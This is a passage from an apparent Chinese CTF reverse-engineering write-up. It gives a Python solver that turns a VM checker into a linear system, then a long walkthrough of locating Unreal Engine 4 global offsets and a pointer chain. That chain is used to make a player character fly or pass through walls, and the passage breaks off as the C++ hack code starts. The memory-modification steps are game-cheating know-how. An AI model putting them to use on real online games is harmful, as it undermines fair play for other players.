100。</p><p>如果再来一个块，让它计算 x0 - x1 + 2*x2 &#x3D; 50，响应用符号执行同样的流程，就能得到第二条方程。把这两条放在一起就是个小的线性方程组，解出来就能知道三个输入字符的值。</p><p>为什么能这样?因为我们之前观察了指令</p><ol><li>只有线性变化</li><li>执行约260条指令才check，也就是这么多指令对应一个check</li></ol><p>不就刚好组成一个方程组了吗 0.0</p><p>exp：</p><blockquote><p>GPT5帮着修了好久的脚本</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> Fraction</span><br><span class="line"></span><br><span class="line">MOD = <span class="number">1</span> &lt;&lt; <span class="number">16</span></span><br><span class="line">BLOCK_SIZE = <span class="number">260</span></span><br><span class="line">NUM_BLOCKS = <span class="number">36</span></span><br><span class="line">INSTR_COUNT = BLOCK_SIZE * NUM_BLOCKS</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">locate_bytecode</span>(<span class="params">blob, need=INSTR_COUNT</span>):</span><br><span class="line">    run = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> off <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(blob) - <span class="number">8</span>, <span class="number">8</span>):</span><br><span class="line">        opcode = <span class="built_in">int</span>.from_bytes(blob[off + <span class="number">6</span>:off + <span class="number">8</span>], <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span> &lt;= opcode &lt;= <span class="number">0xC</span>:</span><br><span class="line">            run += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> run == need:</span><br><span class="line">                <span class="keyword">return</span> off - (need - <span class="number">1</span>) * <span class="number">8</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            run = <span class="number">0</span></span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;bytecode blob not found&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_expr</span>(<span class="params">a, b</span>):</span><br><span class="line">    keys = <span class="built_in">set</span>(a) | <span class="built_in">set</span>(b)</span><br><span class="line">    <span class="keyword">return</span> &#123;k: (a.get(k, <span class="number">0</span>) + b.get(k, <span class="number">0</span>)) % MOD <span class="keyword">for</span> k <span class="keyword">in</span> keys&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_expr</span>(<span class="params">a, b</span>):</span><br><span class="line">    keys = <span class="built_in">set</span>(a) | <span class="built_in">set</span>(b)</span><br><span class="line">    <span class="keyword">return</span> &#123;k: (a.get(k, <span class="number">0</span>) - b.get(k, <span class="number">0</span>)) % MOD <span class="keyword">for</span> k <span class="keyword">in</span> keys&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_block</span>(<span class="params">insts</span>):</span><br><span class="line">    regs = &#123;i: &#123;<span class="string">&#x27;const&#x27;</span>: <span class="number">0</span>&#125; <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>)&#125;</span><br><span class="line">    mem = &#123;i: &#123;<span class="string">f&#x27;x<span class="subst">&#123;i&#125;</span>&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;const&#x27;</span>: <span class="number">0</span>&#125; <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>)&#125;</span><br><span class="line">    mem[<span class="number">0x26</span>] = &#123;<span class="string">&#x27;const&#x27;</span>: <span class="number">0</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> dst, op1, op2, opcode <span class="keyword">in</span> insts:</span><br><span class="line">        <span class="keyword">if</span> opcode == <span class="number">1</span>:  <span class="comment"># set reg</span></span><br><span class="line">            regs[dst] = &#123;<span class="string">&#x27;const&#x27;</span>: op1 % MOD&#125;</span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">3</span>:  <span class="comment"># add</span></span><br><span class="line">            regs[dst] = add_expr(regs[op1], regs[op2])</span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">10</span>:  <span class="comment"># sub</span></span><br><span class="line">            regs[dst] = sub_expr(regs[op1], regs[op2])</span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">5</span>:  <span class="comment"># store mem</span></span><br><span class="line">            addr = regs[dst][<span class="string">&#x27;const&#x27;</span>] % MOD</span><br><span class="line">            mem[addr] = <span class="built_in">dict</span>(regs[op1])</span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">6</span>:  <span class="comment"># load mem</span></span><br><span class="line">            addr = regs[dst][<span class="string">&#x27;const&#x27;</span>] % MOD</span><br><span class="line">            regs[op1] = <span class="built_in">dict</span>(mem.get(addr, &#123;<span class="string">&#x27;const&#x27;</span>: <span class="number">0</span>&#125;))</span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">4</span>:  <span class="comment"># xor (实际上只用于清零)</span></span><br><span class="line">            regs[dst] = &#123;<span class="string">&#x27;const&#x27;</span>: <span class="number">0</span>&#125;</span><br><span class="line">        <span class="comment"># 其它 opcode（比较/校验）不会影响线性方程，忽略即可</span></span><br><span class="line">    expr = mem[<span class="number">0x26</span>]</span><br><span class="line">    coeffs = [<span class="number">0</span>] * <span class="number">36</span></span><br><span class="line">    <span class="keyword">for</span> label, value <span class="keyword">in</span> expr.items():</span><br><span class="line">        <span class="keyword">if</span> label == <span class="string">&#x27;const&#x27;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        idx = <span class="built_in">int</span>(label[<span class="number">1</span>:])</span><br><span class="line">        coeffs[idx] = value <span class="keyword">if</span> value &lt; <span class="number">0x8000</span> <span class="keyword">else</span> value - <span class="number">0x10000</span></span><br><span class="line">    target = regs[<span class="number">1</span>][<span class="string">&#x27;const&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> target &gt;= <span class="number">0x8000</span>:</span><br><span class="line">        target -= <span class="number">0x10000</span></span><br><span class="line">    <span class="keyword">return</span> coeffs, target</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_system</span>(<span class="params">blob</span>):</span><br><span class="line">    start = locate_bytecode(blob)</span><br><span class="line">    coeffs, targets = [], []</span><br><span class="line">    <span class="keyword">for</span> blk <span class="keyword">in</span> <span class="built_in">range</span>(NUM_BLOCKS):</span><br><span class="line">        base = start + blk * BLOCK_SIZE * <span class="number">8</span></span><br><span class="line">        block = [</span><br><span class="line">            struct.unpack_from(<span class="string">&#x27;&lt;HHHH&#x27;</span>, blob, base + i * <span class="number">8</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(BLOCK_SIZE)</span><br><span class="line">        ]</span><br><span class="line">        row, rhs = run_block(block)</span><br><span class="line">        coeffs.append(<span class="built_in">list</span>(<span class="built_in">map</span>(Fraction, row)))</span><br><span class="line">        targets.append(Fraction(rhs))</span><br><span class="line">    <span class="keyword">return</span> coeffs, targets</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_linear</span>(<span class="params">A, b</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(A)</span><br><span class="line">    M = [row[:] <span class="keyword">for</span> row <span class="keyword">in</span> A]</span><br><span class="line">    y = b[:]</span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        pivot = <span class="built_in">max</span>(<span class="built_in">range</span>(col, n), key=<span class="keyword">lambda</span> r: <span class="built_in">abs</span>(M[r][col]))</span><br><span class="line">        <span class="keyword">if</span> M[pivot][col] == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;singular matrix&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> pivot != col:</span><br><span class="line">            M[col], M[pivot] = M[pivot], M[col]</span><br><span class="line">            y[col], y[pivot] = y[pivot], y[col]</span><br><span class="line">        pivot_val = M[col][col]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(col, n):</span><br><span class="line">            M[col][j] /= pivot_val</span><br><span class="line">        y[col] /= pivot_val</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(col + <span class="number">1</span>, n):</span><br><span class="line">            factor = M[row][col]</span><br><span class="line">            <span class="keyword">if</span> factor == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(col, n):</span><br><span class="line">                M[row][j] -= factor * M[col][j]</span><br><span class="line">            y[row] -= factor * y[col]</span><br><span class="line">    x = [Fraction(<span class="number">0</span>)] * n</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        s = y[i]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, n):</span><br><span class="line">            s -= M[i][j] * x[j]</span><br><span class="line">        x[i] = s</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">int</span>(<span class="built_in">round</span>(val)) <span class="keyword">for</span> val <span class="keyword">in</span> x]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    blob = <span class="built_in">open</span>(<span class="string">&#x27;chall&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    A, b = build_system(blob)</span><br><span class="line">    chars = solve_linear(A, b)</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> chars)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>DASCTF{w4ll_CpP_4nD_1O5_1S_Qu1T_FuN}</p><h2 id="那些努力过没出的题"><a href="#那些努力过没出的题" class="headerlink" title="那些努力过没出的题"></a>那些努力过没出的题</h2><h3 id="Python’s-Shed-Skin"><a href="#Python’s-Shed-Skin" class="headerlink" title="Python’s Shed Skin"></a>Python’s Shed Skin</h3><p>可惜了，delta好像是0xdeadbeef，好像魔改了50，纯静态分析，时间不够了，花时间调一下有可能可以做出来</p><p><a href="https://tool.lu/pyc/">python反编译 - 在线工具</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.12</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ezpy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    user_input = <span class="built_in">input</span>(<span class="string">&#x27;Please input your flag: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> ezpy.encrypt_check_flag(user_input):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Correct Flag! You are a master of reversing!&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Wrong Flag! Keep trying.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Overwatch"><a href="#Overwatch" class="headerlink" title="Overwatch"></a>Overwatch</h3><p>比较想做出来的一道题</p><p>overwatch的话偏移搞错了，不然应该至少能出一段flag，一直以为是gworld搞错了，因为之前提取一直报错提示我gobject，后来能dump，却只有一点信息，那么猜想必然是gworld错了…结果打脸了</p><p>还有就是不知道为什么搜索seameless还有些常见字符串都搜索不到，出现这种情况，或者直接没有，看了源码才勉强能搜到一两个…</p><p><strong>赛后下面那个偏移问题(主要是被网上某篇瞎写的博客和IDA字符串加载给暗算了)解决了自己做了下直接出了一段flag，后一段flag没找到只能看wp了</strong></p><blockquote><p>好的!我知道了尴尬了，我还是太着急了，刚刚写这个wp的时候又打开来了(之前保存的i64)，搜了一下seamless，发现直接出现了，原来是IDA加载太慢了，我太急了，我就不该上课 T.T </p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013222036823.png" alt="image-20251013222036823"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013221924088.png" alt="image-20251013221924088"></p></blockquote><p>dump工具：<a href="https://github.com/Spuckwaffel/UEDumper">Spuckwaffel&#x2F;UEDumper: The most powerful Unreal Engine Dumper and Editor for UE 4.19 - 5.3</a></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251012162204075.png" alt="image-20251012162204075"></p><p>可以看这个视频</p><p><a href="https://www.youtube.com/watch?v=M7VLd1xrVoM">https://www.youtube.com/watch?v=M7VLd1xrVoM</a></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251012172315439.png" alt="image-20251012172315439"></p><p>说一下找三件套吧</p><p>Fname找ByteObject</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014102225239.png" alt="image-20251014102225239"></p><p>交叉引用这个方法，是最上面那个</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014102258624.png" alt="image-20251014102258624"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014102334465.png" alt="image-20251014102334465"></p><p>第一个偏移：0x4869C80</p><blockquote><p>ps：可以看那个印度佬的视频，挺好的，先去rebase里把机制定位0</p></blockquote><p>找UWorld时，我是IDA没加载出来这个”Seamless”字符串</p><blockquote><p>关于如何对照源码<a href="https://www.bilibili.com/video/BV19R4y1g7i3/?spm_id_from=333.1007.top_right_bar_window_custom_collection.content.click&vd_source=d76ad0aadca055336653cd966075f064">虚幻4 UE4 逆向 寻找 世界地址 UWORLD地址 教程_哔哩哔哩_bilibili</a></p><p>可以先去github把对应版本的源码下载下来，需要加入epicgame组织先，</p></blockquote><p>所以我对照了源码最终找到一个</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014102621791.png" alt="image-20251014102621791"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014102704430.png" alt="image-20251014102704430"></p><p>当然常规的方法更简单一点</p><blockquote><p>搜索： SeamlessTravel FlushLevelStreaming</p></blockquote><p>往上直接找到：</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014103045269.png" alt="image-20251014103045269"></p><p>第二个uworld有了：49ee370</p><p>第三个gobject，我也是死在这了…</p><p>我找的偏移是0x48A5FC0</p><p>看了wp发现是：0x48A5FD0</p><p>….</p><p>就差0x10，可能是数据结构哪里搞错了应该</p><p>当时找了</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014104421969.png" alt="image-20251014104421969"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014104434870.png" alt="image-20251014104434870"></p><p>当时字符串没加载出来，简单的把48A5FC0作为Gobject肯定不对，都跟上面不太像其实</p><p>实际上被误导了?</p><p><a href="https://www.cnblogs.com/revercc/p/17641855.html#%E5%AF%BB%E6%89%BEguobjectarray">ue5游戏逆向之寻找GWorld，GName和GUObjectArray - 怎么可以吃突突 - 博客园</a></p><p>这里虽然是ue5的方法，但是道理应该差不多，为什么偏移不对?</p><p>官解搜索的是：NewObject with….</p><p>可是我看了下引用：</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014105547046.png" alt="image-20251014105547046"></p><p>这找个damn…</p><p>不知道是不是我IDA的原因</p><p>运气足够好,第二个就是</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014105748059.png" alt="image-20251014105748059"></p><p>但是我并没有找到源码中对应的寻找方式，可能是源码中把NewObject字符串包装了，得搜索引用这个函数的才能去找GUObject</p><p>推荐搜索Failed to load Enginee class，跟刚才的NewObject With到达的是一个地方</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014110256024.png" alt="image-20251014110256024"></p><p>48A5FD0</p><p>offset.h里填好</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014110520421.png" alt="image-20251014110520421"></p><p>dump成功如下</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014110946452.png" alt="image-20251014110946452"></p><p>后面就是游戏逆向，猜测flag在墙外，因而只有几种常规方法：透视(墙不见) 穿墙 飞天遁地</p><p>在merged_AudioMixer_Engine_UMG_MovieScene_MovieSceneTracks.h种有</p><blockquote><p>这个文件不是引擎原生的源码文件，而是 <strong>自动合并生成的头文件</strong>，</p><p>目的是把多个模块导出的类、枚举、结构体合并在一个文件中方便分析。</p></blockquote><p>这个枚举定义在 UE 原版引擎中是 <strong>角色移动组件（Character Movement Component）</strong> 的核心枚举</p><table><thead><tr><th>模式</th><th>场景举例</th><th>行为逻辑</th></tr></thead><tbody><tr><td><code>MOVE_None</code></td><td>不可移动（如被眩晕、冻结）</td><td>停止更新物理</td></tr><tr><td><code>MOVE_Walking</code></td><td>在地面上走</td><td>使用地面摩擦力、速度计算</td></tr><tr><td><code>MOVE_NavWalking</code></td><td>AI 路径导航行走</td><td>使用 NavMesh</td></tr><tr><td><code>MOVE_Falling</code></td><td>从高处坠落</td><td>使用重力</td></tr><tr><td><code>MOVE_Swimming</code></td><td>在水中游动</td><td>使用流体阻力、浮力</td></tr><tr><td><code>MOVE_Flying</code></td><td>飞行类角色（如幽灵、飞行器）</td><td>关闭重力，使用自由三维移动</td></tr><tr><td><code>MOVE_Custom</code></td><td>自定义移动，如“攀爬”、“滑行”</td><td>游戏开发者自己扩展逻辑</td></tr></tbody></table><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014193847028.png" alt="image-20251014193847028"></p><p>我们能发现这里还有</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014201041665.png" alt="image-20251014201041665"></p><p>ACharacter是什么?</p><blockquote><p>ACharacter：UE4 自带的行走类Actor，继承自 APawn。含网格体、胶囊体、UCharacterMovementComponent 等，负责角色移动、跳跃等行为。你操作飞行&#x2F;穿墙时的目标对象就是本地玩家的 ACharacter 实例</p></blockquote><p>这些是 <strong>编译时静态断言（static_assert）</strong>，用于验证 <strong>类成员变量的内存偏移</strong>是否正确。</p><p><code>UCharacterMovementComponent::MovementMode</code> 与 <code>PendingLaunchVelocity</code>这些字段属于 <code>UCharacterMovementComponent</code>（角色移动组件），控制角色的物理状态。</p><p>我们除了这些关键属性之外还需要知道世界链路</p><p>在 UE 逆向中，<strong>找到世界链路</strong> 是理解游戏对象体系的关键。</p><p><strong>世界结构简图：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GWorld → UWorld</span><br><span class="line">         ├─ PersistentLevel (ULevel)</span><br><span class="line">         │   ├─ AActor[0] = DefaultPawn</span><br><span class="line">         │   ├─ AActor[1] = PlayerCharacter</span><br><span class="line">         │   └─ ...</span><br><span class="line">         ├─ GameInstance</span><br><span class="line">         ├─ GameMode</span><br><span class="line">         ├─ PlayerController</span><br><span class="line">         └─ etc.</span><br></pre></td></tr></table></figure><table><thead><tr><th>名称</th><th>类型</th><th>含义</th></tr></thead><tbody><tr><td><strong><code>GWorld</code></strong></td><td><code>UWorld*</code> 全局指针</td><td>当前正在运行的世界（全局变量）</td></tr><tr><td><strong><code>UWorld</code></strong></td><td>类对象</td><td>世界实例本身，包含关卡、玩家、Actor 列表等</td></tr></tbody></table><blockquote><p><code>GWorld</code> 就是指向当前 <code>UWorld</code> 的全局变量。</p></blockquote><p>在内存调试中，通常会通过 <code>GWorld</code> 找到整个世界的根：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UWorld* World = GWorld;</span><br><span class="line">ULevel* Level = World-&gt;PersistentLevel;</span><br><span class="line">TArray&lt;AActor*&gt; Actors = Level-&gt;Actors;</span><br></pre></td></tr></table></figure><p>这样就能遍历世界中所有的角色对象。</p><table><thead><tr><th>元素</th><th>含义</th><th>逆向用途</th></tr></thead><tbody><tr><td><code>offsetof</code></td><td>成员偏移</td><td>定位内存字段、直接读写对象成员</td></tr><tr><td><code>CharacterMovement</code></td><td>角色移动组件指针</td><td>控制角色物理行为（走、飞、跳）</td></tr><tr><td><code>CapsuleComponent</code></td><td>碰撞体组件</td><td>检测碰撞、修改 hitbox 尺寸</td></tr><tr><td><code>MovementMode</code></td><td>当前移动模式</td><td>判断或强制移动状态</td></tr><tr><td><code>PendingLaunchVelocity</code></td><td>等待应用的速度</td><td>修改跳跃或击飞效果</td></tr><tr><td><code>GWorld → UWorld</code></td><td>世界根节点</td><td>遍历所有 Actor，找到玩家对象</td></tr></tbody></table><p>在游戏中找到了玩家对象地址 <code>PlayerCharacter</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UCharacterMovementComponent* MoveComp =  *(UCharacterMovementComponent**)(PlayerCharacter + 0x288);</span><br></pre></td></tr></table></figure><p>接下来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MoveComp-&gt;MovementMode = EMovementMode::MOVE_Flying;</span><br><span class="line">MoveComp-&gt;PendingLaunchVelocity = FVector(0, 0, 3000);</span><br></pre></td></tr></table></figure><p>角色立刻能在空中飞行或超高跳。</p><ul><li>UWorld::OwningGameInstance：指向当前世界所属的 UGameInstance。GameInstance 持有全局状态，如本地玩家列表、子系统等，是沿 GWorld 找到你这边玩家控制器的入口。</li><li>APawn：可被玩家或 AI 控制的 Actor 基类。ACharacter 就是 APawn 的一个扩展版本，加入了骨骼网格和 CharacterMovement。</li><li>APlayerController::AcknowledgedPawn：玩家控制器当前“正式控制”的 Pawn 指针。正常游戏里它就是你的角色 Pawn（如 ACharacter），读取后才能继续修改移动组件&#x2F;碰撞。</li><li>APlayerController：表示本地或远端的玩家控制器，处理输入、相机、HUD 等。我们从 UGameInstance::LocalPlayers 取得的 ULocalPlayer-&gt;PlayerController 就是本地玩家的控制器，顺着它的 AcknowledgedPawn 拿到角色后才能进行后续 hack。</li></ul><p>世界链路</p><ul><li>GWorld（基址 base + 0x49EE370，与setOffsets() 中 OFFSET_GWORLD 相符）指向当前关卡对应的 UWorld。</li><li>UWorld + 0x180（OwningGameInstance）拿到 UGameInstance，这是全局封装玩家列表的对象。</li><li>UGameInstance + 0x38（LocalPlayers 的 TArray）提供本地玩家数组，下标 0 通常是本地玩家。</li><li>ULocalPlayer-&gt;PlayerController（UPlayer::PlayerController 在 …:8986 给出 0x30）接到 APlayerController，再用 AcknowledgedPawn 偏移 0x2A0 取到实际 Pawn。</li><li>Pawn + 0x288（CharacterMovement）就能定位 UCharacterMovementComponent；后续通过 MovementMode、PendingLaunchVelocity 等偏移修改为飞行或冲刺，或者抓取 CapsuleComponent(0x290) 调 SetCollisionEnabled 实现穿墙。</li></ul><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014220645122.png" alt="image-20251014220645122"></p><p>在编写代码时我们可以用reinterpret_cast</p><p>reinterpret_cast<T>(expr) 是 C++ 提供的强制类型转换之一：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在没有类型信息/类定义不足的情况下，把某个指针或整数当成别的类型的指针来访问。</span><br><span class="line">与UE这类内存操作结合时，我们经常只有偏移值，所以先把基址转成 uint8_t*，加偏移后再 reinterpret_cast&lt;目标类型*&gt;，这样就能把那块内存看成某个字段或结构。</span><br></pre></td></tr></table></figure><p>FVector 在 BasicType.h 里被定义成三个 float 分量（X&#x2F;Y&#x2F;Z）。C++ 允许对这种简单结构做聚合初始化，{a, b, c} 就会依次填入 X&#x2F;Y&#x2F;Z，所以 {0.f, 0.f, 800.f} 会写成 (0,0,800)。</p><p>数值 800&#x2F;600 只是示例：PendingLaunchVelocity 相当于给角色一个即将施加的冲量，LastUpdateVelocity 是当前速度。这两个字段只要写入任何 FVector，UE4 就会按这些分量处理运动；如果想要更慢或更快的上升，可以自己改成别的值。</p><p>exp：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 